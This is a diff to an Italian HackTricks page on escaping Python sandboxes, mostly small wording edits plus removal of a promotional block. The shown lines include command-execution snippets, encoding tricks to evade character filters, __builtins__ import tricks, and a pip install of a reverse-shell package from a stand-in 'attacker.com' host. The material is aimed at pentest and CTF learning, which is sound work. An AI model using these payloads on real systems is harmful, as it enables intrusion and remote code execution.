@@ -15,19 +15,11 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-Questi sono alcuni trucchi per bypassare le protezioni della sandbox di Python ed eseguire comandi arbitrari.
+Questi sono alcuni trucchi per bypassare le protezioni delle sandbox di Python ed eseguire comandi arbitrari.
 
 ## Librerie di Esecuzione Comandi
 
-La prima cosa che devi sapere è se puoi eseguire direttamente codice con qualche libreria già importata, o se potresti importare una di queste librerie:
+La prima cosa che devi sapere è se puoi eseguire direttamente codice con qualche libreria già importata, o se puoi importare una di queste librerie:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -100,7 +92,7 @@ Se hai accesso a `pip` o `pip.main()`, puoi installare un pacchetto arbitrario e
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Puoi scaricare il pacchetto per creare la reverse shell qui. Si prega di notare che prima di utilizzarlo dovresti **decomprimerlo, modificare il `setup.py` e inserire il tuo IP per la reverse shell**:
+Puoi scaricare il pacchetto per creare la reverse shell qui. Si prega di notare che prima di utilizzarlo è necessario **decomprimerlo, modificare il `setup.py` e inserire il proprio IP per la reverse shell**:
 
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
@@ -114,7 +106,7 @@ Questo pacchetto si chiama `Reverse`. Tuttavia, è stato appositamente creato in
 Nota che exec consente stringhe multilinea e ";", ma eval non lo fa (controlla l'operatore walrus)
 {% endhint %}
 
-Se certi caratteri sono vietati, puoi utilizzare la **rappresentazione hex/octal/B64** per **bypassare** la restrizione:
+Se alcuni caratteri sono vietati, puoi utilizzare la **rappresentazione hex/octal/B64** per **bypassare** la restrizione:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -330,7 +322,7 @@ pass
 * [**Funzioni builtins di python2**](https://docs.python.org/2/library/functions.html)
 * [**Funzioni builtins di python3**](https://docs.python.org/3/library/functions.html)
 
-Se puoi accedere all'oggetto **`__builtins__`** puoi importare librerie (nota che potresti anche usare qui un'altra rappresentazione stringa mostrata nell'ultima sezione):
+Se puoi accedere all'oggetto **`__builtins__`** puoi importare librerie (nota che potresti anche usare qui un'altra rappresentazione di stringa mostrata nell'ultima sezione):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
@@ -561,7 +553,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Ricerca Ricorsiva di Builtins, Globals...
 
 {% hint style="warning" %}
-Questo è semplicemente **fantastico**. Se stai **cercando un oggetto come globals, builtins, open o qualsiasi altra cosa**, usa questo script per **trovare ricorsivamente i luoghi in cui puoi trovare quell'oggetto.**
+Questo è semplicemente **fantastico**. Se stai **cercando un oggetto come globals, builtins, open o qualsiasi altra cosa** usa semplicemente questo script per **trovare ricorsivamente i luoghi in cui puoi trovare quell'oggetto.**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -678,7 +670,7 @@ print(SEARCH_FOR)
 if __name__ == "__main__":
 main()
 ```
-Puoi controllare l'output di questo script in questa pagina:
+Puoi controllare l'output di questo script su questa pagina:
 
 {% content-ref url="https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md" %}
 [https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md](https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md)
@@ -881,7 +873,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Nota che **se non puoi importare `dis` nel sandbox di python** puoi ottenere il **bytecode** della funzione (`get_flag.func_code.co_code`) e **disassemblarlo** localmente. Non vedrai il contenuto delle variabili che vengono caricate (`LOAD_CONST`), ma puoi indovinarle da (`get_flag.func_code.co_consts`) perché `LOAD_CONST` indica anche l'offset della variabile che viene caricata.
+Nota che **se non puoi importare `dis` nel sandbox python** puoi ottenere il **bytecode** della funzione (`get_flag.func_code.co_code`) e **disassemblarlo** localmente. Non vedrai il contenuto delle variabili che vengono caricate (`LOAD_CONST`), ma puoi indovinarle da (`get_flag.func_code.co_consts`) perché `LOAD_CONST` indica anche l'offset della variabile che viene caricata.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -906,7 +898,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## Compilare Python
 
 Ora, immaginiamo che in qualche modo tu possa **estrarre le informazioni su una funzione che non puoi eseguire** ma che **devi** **eseguire**.\
-Come nel seguente esempio, puoi **accedere all'oggetto codice** di quella funzione, ma leggendo solo il disassemblaggio non **sai come calcolare il flag** (_immagina una funzione `calc_flag` più complessa_)
+Come nel seguente esempio, puoi **accedere all'oggetto codice** di quella funzione, ma leggendo semplicemente il disassemblaggio non **sai come calcolare il flag** (_immagina una funzione `calc_flag` più complessa_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -966,8 +958,8 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-Negli esempi precedenti all'inizio di questo post, puoi vedere **come eseguire qualsiasi codice python utilizzando la funzione `compile`**. Questo è interessante perché puoi **eseguire interi script** con cicli e tutto in un **un'unica riga** (e potremmo fare lo stesso usando **`exec`**).\
-Comunque, a volte potrebbe essere utile **creare** un **oggetto compilato** su una macchina locale ed eseguirlo nella **macchina CTF** (ad esempio perché non abbiamo la funzione `compiled` nel CTF).
+Negli esempi precedenti all'inizio di questo post, puoi vedere **come eseguire qualsiasi codice python utilizzando la funzione `compile`**. Questo è interessante perché puoi **eseguire interi script** con cicli e tutto in un **unica riga** (e potremmo fare lo stesso usando **`exec`**).\
+Comunque, a volte potrebbe essere utile **creare** un **oggetto compilato** su una macchina locale ed eseguirlo sulla **macchina CTF** (ad esempio perché non abbiamo la funzione `compiled` nel CTF).
 
 Ad esempio, compiliamo ed eseguiamo manualmente una funzione che legge _./poc.py_:
 ```python
@@ -1028,7 +1020,7 @@ print("\nYou are a super user\n")
 except AssertionError:
 print(f"\nNot a Super User!!!\n")
 ```
-will be bypassed
+sarà eluso
 
 ## Riferimenti
 
@@ -1039,11 +1031,6 @@ will be bypassed
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
 Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
